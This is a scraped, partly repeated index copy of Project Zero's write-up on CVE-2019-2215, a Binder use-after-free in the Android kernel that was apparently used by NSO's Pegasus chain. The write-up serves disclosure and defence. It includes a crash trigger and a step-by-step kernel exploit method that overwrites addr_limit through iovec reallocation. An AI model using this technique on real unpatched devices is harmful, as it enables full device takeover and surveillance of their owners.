vendor, defender, researcher, journalist, threat analyst, policy specialist, victims\u2019 advocate, or someone else, we all have a role we can play to make it hard to exploit 0-days in the wild. Please feel free to reach out to me to explore how we may be able to work together. The rest of this post is to drive this conversation forward by sharing one instance of such work: CVE-2019-2215. This blog post will explain the bug and the methodology for finding it, how the proof-of-concept exploit we released works, and the evidence and commentary on the use of this bug for in-the-wild exploitation. Hunting the Bug In late summer 2019, Google\u2019s Threat Analysis Group (TAG), Android Security, and Project Zero team received information suggesting that NSO had a 0-day exploit for Android that was part of an attack chain that installed Pegasus spyware on target devices. We received details about the marketed \u201ccapability\u201d. These details included facts about the bug and exploit methodology, including: It is a kernel privilege escalation using a use-after-free vulnerability, reachable from inside the Chrome sandbox. It works on Pixel 1 and 2, but not Pixel 3 and 3a. It was patched in the Linux kernel >= 4.14 without a CVE. CONFIG_DEBUG_LIST breaks the primitive. CONFIG_ARM64_UAO hinders exploitation. The vulnerability is exploitable in Chrome's renderer processes under Android's isolated_app SELinux domain. The exploit requires little or no per-device customization. A list of affected and unaffected devices and their versions, and more. A non-exhaustive list is available in the description of issue 1942 . Each of these facts gave us important information to scope down the potential bug that we were looking for. \u201cIt is a kernel privilege escalation using a use-after-free vulnerability, accessible from inside the Chrome sandbox.\u201d We know that it\u2019s a use-after-free in the kernel. \"It works on Pixel 1 and 2, but not Pixel 3 and 3a.\" We can diff the Pixel 2 and Pixel 3 kernels looking for changes. \"It was patched in the Linux kernel >= 4.14 without a CVE.\" The Pixel 3 is based on the Linux kernel 4.9 and doesn\u2019t include the vulnerability, but the fix is not in the 4.9 Linux kernel, only 4.14. \"CONFIG_DEBUG_LIST breaks the primitive.\" This was an extremely helpful tip. In the kernel, there are only two actions (three functions) whose behavior changes based on the CONFIG_DEBUG_LIST flag: adding (__list_add) and deleting (__list_del_entry and list_del) from a doubly linked list. Therefore, we could infer that the freed obj is a linked list and has an add or delete performed on it after the free occurs. \"CONFIG_ARM64_UAO hinders exploitation.\" Likely means that the exploit is using the memory corruption to overwrite the address limit that is stored near the start of the task_struct. (It would normally be stored at the bottom of the stack on Linux <=4.9, but Android backported the change that moved it into task_struct to protect against stack overflows to older kernels.) The exploit requires little or no per-device customization. We can assume the bug and its exploitation methodology are in the common kernel rather than in code that is often customized, like the framework. \"A list of affected and unaffected devices and their versions.\" Whenever there was a candidate bug that seemed to fit all the requirements above, I then vetted it against the list of affected and unaffected devices. Based on these details, I began combing through changelogs and patches looking for the potential bug. Finding CVE-2019-2215 actually occured on my second attempt. I had originally thought the potential bug was a different issue, but then ruled it out based on the information above. A few weeks after my first attempt at tracking down this bug, others recommended that I should look at Binder. Looking back, the detail that states \u201cThe vulnerability is exploitable in Chrome's renderer processes under Android's isolated_app SELinux domain.\u201d should have caused me to look at the Binder driver first, but it didn\u2019t. When I diffed the Pixel 2 and Pixel 3 drivers/android/binder.c files and their changelogs, there were only a few significant changes. Commit 550c01d0e051461437d6e9d72f573759e7bc5047 stood out in the log because: It discusses fixing a \u201cuse-after-free\u201d in the commit message, It is a patch from upstream, and The upstream patch was only applied to 4.14. I then began to evaluate this bug against the other requirements of the bug in the leads and found that it matched them perfectly. I also looked through every other change to Binder (~25) between the Pixel 2 and Pixel 3, and no other changes matched every detail. We wrote a proof-of-concept of our own that demonstrates how this bug can be exploited. The Original Discovery of the Bug This bug was originally found and reported in November 2017 and patched in February 2018. Syzbot, a syzkaller system that continuously fuzzes the Linux kernel, originally reported the use-after-free bug to Linux kernel mailing lists and the syzkaller-bugs mailing list in November 2017. From this report, the bug was patched in the Linux 4.14 , Android 3.18 , Android 4.4 , and Android 4.9 kernels in February 2018. However, this fix was never included in an Android monthly security bulletin and thus the bug was never patched in many already released devices, such as Pixel and Pixel 2. Android provided the following statement on the original discovery of the bug. \"Android was informed of the security implications of this bug by Project Zero on September 26, 2019. Android partners were notified of the bug and provided updates to address it within 24 hours. Android also assigned CVE-2019-2215 to explicitly indicate that it represents a security vulnerability as the original report from syzkaller and the corresponding Linux 4.14 patch did not highlight any security implications. Pixel 3 and 3a were already protected against these issues. Updates for affected Pixel devices were available to users as early as October 7th, 2019 .\u201d Technical Details of the Bug The bug is a use-after-free (UAF) in the Binder driver. The binder_thread struct, defined in drivers/android/binder.c , has the member wait of the wait_queue_head_t struct type. wait is still referenced by a pointer in epoll, even after the binder_thread struct containing it is freed. struct binder_thread { struct binder_proc *proc; struct rb_node rb_node; struct list_head waiting_thread_node; int pid; int looper; /* only modified by this thread */ bool looper_need_return; /* can be written by other thread */ struct binder_transaction *transaction_stack; struct list_head todo; bool process_todo; struct binder_error return_error; struct binder_error reply_error; wait_queue_head_t wait; struct binder_stats stats; atomic_t tmp_ref; bool is_dead; struct task_struct *task; }; struct __wait_queue_head { spinlock_t lock; struct list_head task_list; }; typedef struct __wait_queue_head wait_queue_head_t; The BINDER_THREAD_EXIT ioctl calls the binder_thread_release function which frees the binder_thread struct. However, if epoll is called on this thread, binder_poll tells epoll to use wait, the wait queue that is embedded in the binder_thread struct. Therefore, when the binder_thread struct is freed, epoll is pointing to the now freed wait queue. Normally, the wait queue used for polling on a file is guaranteed to be alive until the file\u2019s release handler is called. Rare cases require the use of POLLFREE. In contrast, the Binder driver only worked if you constantly removed and re-added the epoll watch. This is the underlying bug and the use-after-free is a symptom of that. When we look at the stack trace from KASAN in the original report , we can see the use-after-free is in remove_wait_queue in kernel/sched/wait.c. The source code for the remove_wait_queue is below. In the remove_wait_queue function, q is the pointer to the freed wait_queue_head_t in the binder_thread struct and wait is an entry in the wait queue whose head has been freed. The use-after-free that triggered the KASAN crash is the call to spin_lock_irqsave with argument &q->lock when q is pointing to freed memory. However, the __remove_wait_queue call is more interesting for exploitation. As shown below, __remove_wait_queue simply calls list_del on the task_list in the wait queue, giving us an unlinking primitive. void remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait) { unsigned long flags; spin_lock_irqsave(&q->lock, flags); __remove_wait_queue(q, wait); spin_unlock_irqrestore(&q->lock, flags); } __remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old) { list_del(&old->task_list); } The bug can be triggered with the following code, which was also in the original report from syzkaller. #include <fcntl.h> #include <sys/epoll.h> #include <sys/ioctl.h> #include <unistd.h> #define BINDER_THREAD_EXIT 0x40046208ul int main() { int fd, epfd; struct epoll_event event = { .events = EPOLLIN }; fd = open(\"/dev/binder\", O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event); ioctl(fd, BINDER_THREAD_EXIT, NULL); } I verified that the Pixel 2, running Android 10 with SPL September 2019, still included this bug. The KASAN output is included in the issue tracker . Exploiting the Use-After-Free After confirming the bug and reporting to Android, I began working with fellow team member, Jann Horn, to write a proof-of-concept (PoC) exploit. The PoC we published on the issue tracker in comment #7 used the UAF described above to gain arbitrary kernel read and write from an unprivileged application context. In this section, I will explain how the PoC exploit that we wrote works. This section describes how we decided to exploit this bug and not necessarily how the in-the-wild exploit works. This exploit triggers the UAF twice in order to overwrite the address limit to obtain arbitrary kernel read and write privileges. The first use of the UAF leaks the address of the task_struct, which contains the process\u2019s address limit (addr_limit). The second use of the UAF overwrites the value of addr_limit. The addr_limit value defines which address range may be accessed when dereferencing userspace pointers. Usercopy operations only access addresses below the addr_limit. Therefore, by raising the addr_limit by overwriting it, we will make kernel memory accessible to our unprivileged process. To trigger the UAF, we use vectored (scatter/gather) I/O in a somewhat similar way to what DiShen presented in his talk from Code Blue 2017, \u201cThe Art of Exploiting Unconventional Use-after-free Bugs in Android Kernel\u201d [ video ]. Triggering the UAF To exploit the UAF bug, we reallocate the freed binder_thread memory as an I/O vector and then use the unlinking primitive to gain scoped kernel read to leak the task_struct address. We trigger the UAF again for scoped kernel write to then overwrite the addr_limit. This section describes how we use the UAF for the initial read and write. About Vectored I/O Vectored I/O is also known as scatter/gather I/O. Vectored reads move data from a data source (here a file) into a set of disparate buffers (scatter), moving onto the next after each buffer is filled. A vectored write moves data from a set of buffers into a data sink (here a file) (gather). readv and writev are syscalls for performing vectored I/O. Their definitions from fs/read_write.c are below. SYSCALL_DEFINE3(readv, unsigned long, fd, const struct iovec __user *, vec, unsigned long, vlen) SYSCALL_DEFINE3(writev, unsigned long, fd, const struct iovec __user *, vec, unsigned long, vlen) The vec arguments are arrays of iovec structs where each iovec struct describes a buffer. The iovec struct definition from include/uapi/linux/uio.h is below. struct iovec { void __user *iov_base; __kernel_size_t iov_len; }; We use writev to leak the address of the task_struct the first time we trigger the UAF. In addition to readv and writev, the recvmsg syscall for receiving a message from a socket also uses vectored I/O. In the msghdr, the second argument to recvmsg, there is a member named msg_iov that points to an array of iovec structs. We use recvmsg the second time we trigger the UAF to overwrite the addr_limit. Using vectored I/O for UAF write and read We use the vectored I/O to gain UAF read (leaking the task_struct address) and UAF write (overwriting the addr_limit in the task_struct). Vectored I/O operations (like readv, writev, and recvmsg) import the user-space I/O vector array into kernel space and verify that all of the vector elements are in userspace in the call to rw_copy_check_uvector. If rw_copy_check_uvector returns successfully, the iovec array is now in kernel space and there will not be another verification on the pointer values in the iov_base fields. This means that while the I/O is blocking, we can overwrite the buffer pointers in the iovec array using our UAF read/write and then read from or write to a place in kernel memory. The iovec struct is of size 16 bytes and the binder_thread struct is 408 bytes. Therefore, we will create an array of 25 iovec structs in order to make the iovec array a similar size to the freed struct. The kernel allocates memory based on the size of the allocations so if we can control a struct of almost the same size as the freed memory, then there is a good chance that our controlled struct will be allocated into the same place. The iovec array is 8 bytes smaller than the binder_thread in order to not overwrite the task_struct pointer value at the end of the binder_thread struct, but that is still close enough to be allocated into the same slab, and thus the same position in kernel memory as the freed binder_thread struct. When the iovec array is allocated into the same memory as our freed binder_thread struct, the struct members will line up as below. binder_thread struct iovec array 0x00 0x00: iovec[0].iov_base ... 0x08: iovec[0].iov_len ... ... 0xA0: wait.lock 0xA0: iovec[10].iov_base 0xA8: wait.task_list.next 0xA8: iovec[10].iov_len 0xB0: wait.task_list.prev 0xB0: iovec[11].iov_base ... ... Once the vectored I/O has copied our iovec structs into kernel memory, we then want the I/O operation to block so that ep_remove_wait_queue can run from a separate thread. When ep_remove_wait_queue runs, it will perform a list_del operation on the values at offsets 0xA8 and 0xB0 in our diagram since ep_remove_wait_queue still believes these memory values to be a part of the wait_queue_head_t struct. ep_remove_wait_queue calls remove_wait_queue that calls __remove_wait_queue that calls list_del. static inline void __list_del(struct list_head * prev, struct list_head * next) { next->prev = prev; WRITE_ONCE(prev->next, next); } #ifndef CONFIG_DEBUG_LIST ... static inline void list_del(struct list_head *entry) { __list_del(entry->prev, entry->next); entry->next = LIST_POISON1; entry->prev = LIST_POISON2; } The UAF exploitation technique described in this blog post is not successful when CONFIG_DEBUG_LIST is enabled because list_del is implemented differently when it\u2019s enabled. The implementation when CONFIG_DEBUG_LIST is NOT enabled is shown above. The debug implementation, shown below, is found in lib/list_debug.c. In the debug version, list_del calls __list_del_entry which includes checks to ensure that prev->next == entry && next->prev == entry. If any of these checks fail, BUG_ON will be called and the process will die (and on Android devices, which usually set kernel.panic_on_oops=1, the entire device will reboot). This check is what prevents this exploitation method from working when CONFIG_DEBUG_LIST is enabled. void __list_del_entry(struct list_head *entry) { struct list_head *prev, *next; prev = entry->prev; next = entry->next; if (WARN(next == LIST_POISON1, \"list_del corruption, %p->next is LIST_POISON1 (%p)\\n\", entry, LIST_POISON1) || WARN(prev == LIST_POISON2, \"list_del corruption, %p->prev is LIST_POISON2 (%p)\\n\", entry, LIST_POISON2) || WARN(prev->next != entry, \"list_del corruption. prev->next should be %p, \" \"but was %p\\n\", entry, prev->next) || WARN(next->prev != entry, \"list_del corruption. next->prev should be %p, \" \"but was %p\\n\", entry, next->prev)) { BUG_ON(PANIC_CORRUPTION); return; } __list_del(prev, next); } EXPORT_SYMBOL(__list_del_entry); /** * list_del - deletes entry from list. * @entry: the element to delete from the list. * Note: list_empty on entry does not return true after this, the entry is * in an undefined state. */ void list_del(struct list_head *entry) { __list_del_entry(entry); entry->next = LIST_POISON1; entry->prev = LIST_POISON2; } The entry being passed to list_del is an entry in the wait queue list. The freed wait_queue_head_t struct contains the list head of which this entry is the only member. Prior to the list_del operation, the list looks like in the diagram below. After the list_del the operation looks like the diagram below. The list head prev and next pointers have been set to point to the list head. This means that iov_base has been overwritten with a kernel address and we can now perform scoped read and write operations from the kernel space beginning at the list head. ] Leaking the task_struct pointer We follow the process outlined above to use the use-after-free to leak the task structure pointer. In the Linux kernel, and thus in the Android kernel, the task_struct includes most of the important information about a process. In this case, we want to get the pointer to the task_struct because it includes the process\u2019s address limit. The code to leak the task_struct pointer is in the function leak_task_struct in the PoC. The function starts by adding the binder file descriptor (fd) to the epoll\u2019s interest list. We then create an array of 25 iovec structs. Next, we set the values of each of the iovec entries. For the first 10 entries, we set both the iov_base and iov_len to 0 so that the kernel skips them when processing the vector. iovec[10].iov_base is set to a value that will look like an unlocked spinlock. iovec[10].iov_len is set to the same size as the pipe such that when the pipe will block after moving all the contents from iovec[10].iov_base into the pipe. Once it unblocks, it will begin on iovec[11]. binder_thread struct iovec array 0x00 0x00: iovec[0].iov_base 0x00000000 00000000 ... 0x08: iovec[0].iov_len 0x00000000 00000000 ... ... 0xA0: wait.lock 0xA0: iovec[10].iov_base dummy_page_4g_aligned 0xA8: wait.task_list.next 0xA8: iovec[10].iov_len 0x1000 0xB0: wait.task_list.prev 0xB0: iovec[11].iov_base 0xDEADBEEF ... 0xB8: iovec[11].iov_len 0x1000 ... ... We set iovec[10].iov_base to dummy_page_4g_aligned because we need the lower-half of the address value to be 0 for it to pass as a spinlock. In remove_wait_queue, we need spin_lock_irqsave to run successfully so that __remove_wait_queue is called. For this to be successful, the call to remove_wait_queue from within the EPOLL_CTL_DEL execution must occur after the iovec array has been copied to kernel memory by rw_copy_check_uvector (called by writev) and iovec[10] has been processed (since its length will be clobbered by the UAF write), but before writev begins reading from the address at iovec[11].iov_base. Therefore, we need the writev call to block prior to trying to write the iovec[11] contents to the pipe. To do this, we fill the whole pipe with contents that we don\u2019t care about. Because we completely fill the pipe, writev will block until something begins to read from the pipe. Therefore, we set iovec[10].iov_base to be the address of the buffer with these filler contents and we set its length to the same size as the pipe size. writev will put all of the dummy contents into the pipe and block, giving us time to change the address of iovec[11].iov_base with the unlinking primitive in remove_wait_queue. After remove_wait_queue finishes, we can read the dummy contents from the pipe, unblocking the write. The now-unblocked writev will begin reading from the address in iovec[11].iov_base, which has now been changed to the list head address, binder_thread + 0xa8, in the kernel. Once the writev finishes, we read from the other end of the pipe. The value at offset 0xE8 is the task_struct pointer. (The wait queue list head is at 0xa8 in the binder_thread struct and the task_struct pointer is at 0x190.) Overwriting the Address Limit Now that we have saved off the task_struct pointer, we trigger the UAF again in order to overwrite the address limit (at task_struct + 0x08), this time using recvmsg instead of writev. The process through the list_del is the same: the iov_base ends up pointing to the list_head of the wait_queue. At this point, though, instead of reading from that address, we begin to write the values below. unsigned long second_write_chunk[] = { 1, /* iov_len */ (already used) */ 0xdeadbeef, /* iov_base (already used) */ 0x8 + 2 * 0x10, /* iov_len (already used) */ current_ptr + 0x8, /* next iov_base (addr_limit) */ 8, /* next iov_len (sizeof(addr_limit)) */ 0xfffffffffffffffe /* value to write - new addr_limit */ }; To understand how this overwrites the addr_limit, we need to remember how scatter I/O works: we will read from a unix domain socket to disparate buffers, filling up one before moving to the next. After the list_del, the scatter I/O is about to begin on the buffer at iovec[11].iov_base. The value at iovec[11].iov_base now points to the list head of the wait queue after the list_del operation. The first 5 values we are going to overwrite are our iovec structs. We originally set iovec[11].iov_len to 0x28 which means we write 0x28 bytes before moving to the buffer stored in iovec[12].iov_base. We want to overwrite iovec[12].iov_base to be the address of the addr_limit so that we can overwrite the address limit without having to overwrite everything between the list head and the address limit. This is why we set the length of the iovec[11] buffer to 0x28 bytes: 0x8 bytes each for iovec[10].iov_len, iovec[11].iov_base, iovec[11].iov_len, iovec[12].iov_base, and iovec[12].iovec_len. Then we move to write through the newly-overwritten address in iovec[12].iov_base. This writes 0xFFFFFFFFFFFFFFFE (one less than KERNEL_DS to bypass the segment_eq(get_fs(), KERNEL_DS) branch in iov_iter_init()) to the addr_limit, now making all memory (including kernel memory) accessible as part of the user-space memory range in our process and thus granting arbitrary kernel read and write. Values after list_del operation, prior to recvmsg Values after recvmsg 0x00 0x00 ... ... 0xA8: iovec[10].iov_len +0xA8 (points to itself) list head \u2190 \u2192 0xA8: iovec[10].iov_len 1 0xB0: iovec[11].iov_base +0xA8 (points to previous element) 0xB0: iovec[11].iov_base 0xDEADBEEF 0xB8: iovec[11].iov_len 0x28 0xB8: iovec[11].iov_len 0x28 0xC0: iovec[12].iov_base 0xBEEFDEAD 0xC0: iovec[12].iov_base task_struct + 0x8 0xC8: iovec[12].iov_len 0x8 0xC8: iovec[12].iov_len 0x8 task_struct + 0x8 (addr_limit): 0xFFFFFFFFFFFFFFFE In-the-Wild Analysis As stated in the introduction, we deemed that there was enough credible evidence that CVE-2019-2215 was being used in the wild to support a 7-day disclosure deadline. This credible evidence included the leads and details outlined above in the \u201cHunting the Bug\u201d section, and how after a detailed review of kernel patches, all requirements perfectly aligned with one bug (and only one bug). The examined information included marketing materials for this exploit, and that the exploit was used to install a version of Pegasus. With this evidence, we decided that although we did not have an exploit sample, the risk to users was too great to wait 90 days for a patch and disclosure, and thus reported this to Android under a 7-day deadline. The 7-day deadline exists because \u201ceach day an actively exploited vulnerability remains undisclosed to the public and unpatched, more devices or accounts will be compromised.\u201d Therefore, we decided that this vulnerability required disclosure to the public as soon as possible. Variant Analysis I think the most important \u201cvariant\u201d that we can take away from this bug is that bugs are often patches in the upstream Linux and/or Android kernels that are not flagged as security bugs (though have security impact), so they are not included in the Android Security Bulletin and thus do not get patched in released devices. Sorting through Linux patches is a huge undertaking, so instead, one approach to address this issue could be addressed by regularly syncing with the upstream stable kernels. In addition, we also looked for other variants where the poll handler uses wait queues that are not tied to the lifetime of the file and no issues of similar significance have been discovered so far. Conclusion CVE-2019-2215 permits attackers to fully compromise a device with only untrusted app access or a browser renderer exploit and despite the patch being available in the upstream Linux kernel, it was left unpatched in Android devices for almost 2 years. In that time, we believe that attackers have been able to use this vulnerability to exploit users in the wild. Given the information in various public documents about the services that NSO Group provides, it seems most likely that this vulnerability was chained with either a browser renderer exploit or other remote capability. Kernel vulnerabilities in Android are especially dangerous because they are largely the same across different devices, whereas other components on the device, such as the framework, SOC, or pre-installed apps, are often customized from one device to another and across different manufactures. With this single kernel vulnerability, the majority of Android devices manufactured prior to September 2018 were vulnerable. The patch gapping between the LTS Linux kernel, the Android common kernel, and the kernels running on end-users\u2019 devices leaves a ripe surface area for exploitation. To prevent issues like this, Android could force all devices to sync to both upstream Linux and the Android common kernel at a regular cadence. We publicly disclosed CVE-2019-2215 on October 3, 2019, 7-days after reporting to Android due to credible evidence of in-the-wild exploitation. We made this determination based on documents marketing and detailing an Android exploit \u201ccapability\u201d. Our view is that it's often reasonable to infer that a vulnerability is being exploited in-the-wild from other forms of contextual information (such as the marketing materials seen in this case, combined with a deep analysis of patches) and that a binary/sample isn\u2019t always required. Therefore, each day we waited to disclose meant another day that at-risk users were exposed to harm. On October 6, 2019, Android added updates to the October Android Security Bulletin and addressed the issue. Devices showing a security patch level on or after Oct 6, 2019 should be patched against CVE-2019-2215. This bug highlights that in order to \u201cmake zero-day hard\u201d, we need to work to learn as much as we can from 0-days used in the wild AND share it back with the community so that we can all work together to make this kind of exploitation that much harder. Please reach out and let\u2019s collaborate! tl;dr Leads, even without samples, can help us find bugs and get security vulnerabilities patched. The patch gap between released devices and the kernel leaves a ripe area for exploitation. The kernel is a key layer in Android\u2019s security model. Project Zero is ramping up its in-the-wild 0day analysis work, and we're very open to collaboration. Please reach out! \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html?m=1","title":"Bad Binder:Android In The Wild Exploit"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#bad-binderandroid-in-the-wild-exploit","text":"Posted by Maddie Stone, Project Zero Introduction On October 3, 2019, we disclosed issue 1942 (CVE-2019-2215), which is a use-after-free in Binder in the Android kernel. The bug is a local privilege escalation vulnerability that allows for a full compromise of a vulnerable device. If chained with a browser renderer exploit, this bug could fully compromise a device through a malicious website. We reported this bug under a 7-day disclosure deadline rather than the normal 90-day disclosure deadline. We made this decision based on credible evidence that an exploit for this vulnerability exists in the wild and that it's highly likely that the exploit was being actively used against users. In May 2019, Project Zero published a blog post and spreadsheet for tracking \u201cin-the-wild\u201d 0-day exploits. In July 2019, I joined Project Zero to focus on the use of 0-day exploits in the wild. We expect our approach to this work will change and mature as we gain more experience with studying 0-days, but the mission stays the same: to \u201cmake zero-day hard\u201d. So far there are a few key approaches that we have started with: Hunt for bugs based on rumors/leads that a 0-day is currently in use. We will use our bug hunting expertise to find and patch the bug, rendering the exploit benign. Perform variant analysis on 0-days used in the wild. When looking for bugs, you often find more than one of a similar type at the same time. However, an exploit usually uses one instance of a possible pattern or variant. If we can find and resolve all of the similar variant bugs, then the effort involved in creating a new exploit will be higher. Complete detailed analysis of the 0-days from the point of view of bug hunters and exploit developers and share it back with the community. Transparency and collaboration are key. We want to share detailed root cause analysis to inform developers and defenders on how to prevent these types of bugs in the future and improve detection. We hope that by publishing details about the exploit and its methodology, this can inform threat intelligence and incident responders. Overall, we want to make information that\u2019s often kept in silos accessible to all. This is just the starting point of how we\u2019re thinking about tactical work around 0-day exploits used in the wild, but we won\u2019t make much progress if we try to do this alone. Whether you\u2019re a vendor, defender, researcher, journalist, threat analyst, policy specialist, victims\u2019 advocate, or someone else, we all have a role we can play to make it hard to exploit 0-days in the wild. Please feel free to reach out to me to explore how we may be able to work together. The rest of this post is to drive this conversation forward by sharing one instance of such work: CVE-2019-2215. This blog post will explain the bug and the methodology for finding it, how the proof-of-concept exploit we released works, and the evidence and commentary on the use of this bug for in-the-wild exploitation.","title":"Bad Binder:Android In-The-Wild Exploit"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#hunting-the-bug","text":"In late summer 2019, Google\u2019s Threat Analysis Group (TAG), Android Security, and Project Zero team received information suggesting that NSO had a 0-day exploit for Android that was part of an attack chain that installed Pegasus spyware on target devices. We received details about the marketed \u201ccapability\u201d. These details included facts about the bug and exploit methodology, including: It is a kernel privilege escalation using a use-after-free vulnerability, reachable from inside the Chrome sandbox. It works on Pixel 1 and 2, but not Pixel 3 and 3a. It was patched in the Linux kernel >= 4.14 without a CVE. CONFIG_DEBUG_LIST breaks the primitive. CONFIG_ARM64_UAO hinders exploitation. The vulnerability is exploitable in Chrome's renderer processes under Android's isolated_app SELinux domain. The exploit requires little or no per-device customization. A list of affected and unaffected devices and their versions, and more. A non-exhaustive list is available in the description of issue 1942 . Each of these facts gave us important information to scope down the potential bug that we were looking for. \u201cIt is a kernel privilege escalation using a use-after-free vulnerability, accessible from inside the Chrome sandbox.\u201d We know that it\u2019s a use-after-free in the kernel. \"It works on Pixel 1 and 2, but not Pixel 3 and 3a.\" We can diff the Pixel 2 and Pixel 3 kernels looking for changes. \"It was patched in the Linux kernel >= 4.14 without a CVE.\" The Pixel 3 is based on the Linux kernel 4.9 and doesn\u2019t include the vulnerability, but the fix is not in the 4.9 Linux kernel, only 4.14. \"CONFIG_DEBUG_LIST breaks the primitive.\" This was an extremely helpful tip. In the kernel, there are only two actions (three functions) whose behavior changes based on the CONFIG_DEBUG_LIST flag: adding (__list_add) and deleting (__list_del_entry and list_del) from a doubly linked list. Therefore, we could infer that the freed obj is a linked list and has an add or delete performed on it after the free occurs. \"CONFIG_ARM64_UAO hinders exploitation.\" Likely means that the exploit is using the memory corruption to overwrite the address limit that is stored near the start of the task_struct. (It would normally be stored at the bottom of the stack on Linux <=4.9, but Android backported the change that moved it into task_struct to protect against stack overflows to older kernels.) The exploit requires little or no per-device customization. We can assume the bug and its exploitation methodology are in the common kernel rather than in code that is often customized, like the framework. \"A list of affected and unaffected devices and their versions.\" Whenever there was a candidate bug that seemed to fit all the requirements above, I then vetted it against the list of affected and unaffected devices. Based on these details, I began combing through changelogs and patches looking for the potential bug. Finding CVE-2019-2215 actually occured on my second attempt. I had originally thought the potential bug was a different issue, but then ruled it out based on the information above. A few weeks after my first attempt at tracking down this bug, others recommended that I should look at Binder. Looking back, the detail that states \u201cThe vulnerability is exploitable in Chrome's renderer processes under Android's isolated_app SELinux domain.\u201d should have caused me to look at the Binder driver first, but it didn\u2019t. When I diffed the Pixel 2 and Pixel 3 drivers/android/binder.c files and their changelogs, there were only a few significant changes. Commit 550c01d0e051461437d6e9d72f573759e7bc5047 stood out in the log because: It discusses fixing a \u201cuse-after-free\u201d in the commit message, It is a patch from upstream, and The upstream patch was only applied to 4.14. I then began to evaluate this bug against the other requirements of the bug in the leads and found that it matched them perfectly. I also looked through every other change to Binder (~25) between the Pixel 2 and Pixel 3, and no other changes matched every detail. We wrote a proof-of-concept of our own that demonstrates how this bug can be exploited.","title":"Hunting the Bug"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#the-original-discovery-of-the-bug","text":"This bug was originally found and reported in November 2017 and patched in February 2018. Syzbot, a syzkaller system that continuously fuzzes the Linux kernel, originally reported the use-after-free bug to Linux kernel mailing lists and the syzkaller-bugs mailing list in November 2017. From this report, the bug was patched in the Linux 4.14 , Android 3.18 , Android 4.4 , and Android 4.9 kernels in February 2018. However, this fix was never included in an Android monthly security bulletin and thus the bug was never patched in many already released devices, such as Pixel and Pixel 2. Android provided the following statement on the original discovery of the bug. \"Android was informed of the security implications of this bug by Project Zero on September 26, 2019. Android partners were notified of the bug and provided updates to address it within 24 hours. Android also assigned CVE-2019-2215 to explicitly indicate that it represents a security vulnerability as the original report from syzkaller and the corresponding Linux 4.14 patch did not highlight any security implications. Pixel 3 and 3a were already protected against these issues. Updates for affected Pixel devices were available to users as early as October 7th, 2019 .\u201d","title":"The Original Discovery of the Bug"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#technical-details-of-the-bug","text":"The bug is a use-after-free (UAF) in the Binder driver. The binder_thread struct, defined in drivers/android/binder.c , has the member wait of the wait_queue_head_t struct type. wait is still referenced by a pointer in epoll, even after the binder_thread struct containing it is freed. struct binder_thread { struct binder_proc *proc; struct rb_node rb_node; struct list_head waiting_thread_node; int pid; int looper; /* only modified by this thread */ bool looper_need_return; /* can be written by other thread */ struct binder_transaction *transaction_stack; struct list_head todo; bool process_todo; struct binder_error return_error; struct binder_error reply_error; wait_queue_head_t wait; struct binder_stats stats; atomic_t tmp_ref; bool is_dead; struct task_struct *task; }; struct __wait_queue_head { spinlock_t lock; struct list_head task_list; }; typedef struct __wait_queue_head wait_queue_head_t; The BINDER_THREAD_EXIT ioctl calls the binder_thread_release function which frees the binder_thread struct. However, if epoll is called on this thread, binder_poll tells epoll to use wait, the wait queue that is embedded in the binder_thread struct. Therefore, when the binder_thread struct is freed, epoll is pointing to the now freed wait queue. Normally, the wait queue used for polling on a file is guaranteed to be alive until the file\u2019s release handler is called. Rare cases require the use of POLLFREE. In contrast, the Binder driver only worked if you constantly removed and re-added the epoll watch. This is the underlying bug and the use-after-free is a symptom of that. When we look at the stack trace from KASAN in the original report , we can see the use-after-free is in remove_wait_queue in kernel/sched/wait.c. The source code for the remove_wait_queue is below. In the remove_wait_queue function, q is the pointer to the freed wait_queue_head_t in the binder_thread struct and wait is an entry in the wait queue whose head has been freed. The use-after-free that triggered the KASAN crash is the call to spin_lock_irqsave with argument &q->lock when q is pointing to freed memory. However, the __remove_wait_queue call is more interesting for exploitation. As shown below, __remove_wait_queue simply calls list_del on the task_list in the wait queue, giving us an unlinking primitive. void remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait) { unsigned long flags; spin_lock_irqsave(&q->lock, flags); __remove_wait_queue(q, wait); spin_unlock_irqrestore(&q->lock, flags); } __remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old) { list_del(&old->task_list); } The bug can be triggered with the following code, which was also in the original report from syzkaller. #include <fcntl.h> #include <sys/epoll.h> #include <sys/ioctl.h> #include <unistd.h> #define BINDER_THREAD_EXIT 0x40046208ul int main() { int fd, epfd; struct epoll_event event = { .events = EPOLLIN }; fd = open(\"/dev/binder\", O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event); ioctl(fd, BINDER_THREAD_EXIT, NULL); } I verified that the Pixel 2, running Android 10 with SPL September 2019, still included this bug. The KASAN output is included in the issue tracker .","title":"Technical Details of the Bug"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#exploiting-the-use-after-free","text":"After confirming the bug and reporting to Android, I began working with fellow team member, Jann Horn, to write a proof-of-concept (PoC) exploit. The PoC we published on the issue tracker in comment #7 used the UAF described above to gain arbitrary kernel read and write from an unprivileged application context. In this section, I will explain how the PoC exploit that we wrote works. This section describes how we decided to exploit this bug and not necessarily how the in-the-wild exploit works. This exploit triggers the UAF twice in order to overwrite the address limit to obtain arbitrary kernel read and write privileges. The first use of the UAF leaks the address of the task_struct, which contains the process\u2019s address limit (addr_limit). The second use of the UAF overwrites the value of addr_limit. The addr_limit value defines which address range may be accessed when dereferencing userspace pointers. Usercopy operations only access addresses below the addr_limit. Therefore, by raising the addr_limit by overwriting it, we will make kernel memory accessible to our unprivileged process. To trigger the UAF, we use vectored (scatter/gather) I/O in a somewhat similar way to what DiShen presented in his talk from Code Blue 2017, \u201cThe Art of Exploiting Unconventional Use-after-free Bugs in Android Kernel\u201d [ video ].","title":"Exploiting the 